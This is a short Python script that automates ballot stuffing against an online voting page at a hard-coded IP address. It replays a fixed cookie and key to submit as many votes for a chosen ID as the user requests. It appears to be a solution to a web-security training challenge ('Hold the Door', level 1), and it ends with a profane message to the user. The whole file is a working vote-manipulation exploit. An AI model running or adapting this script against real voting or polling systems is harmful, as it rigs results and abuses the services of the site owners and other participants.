#!/usr/bin/python3
import requests
print("This is an online Voting contest please provide your the ID of the contestor and how many times would you like to vote we'll take care of the rest *WINK ")
a = (input("who to vote for: "))
z = int(input("how any times kind sir?: "))
url = "http://158.69.76.135/level1.php"
ID = a
requests.get(url)
cookies = {
   	'HoldTheDoor': '0749fc95920f8886a16665bd0d3a971dd179b06b',
	}
data = {
 'id': ID,
 'holdthedoor': 'Submit',
 'key': '0749fc95920f8886a16665bd0d3a971dd179b06b'
}
i = 0
while i < z:
	requests.post(url, data=data, cookies=cookies)
	i += 1
print("           DONE! \n     Hope you're happy you lazy fuck")
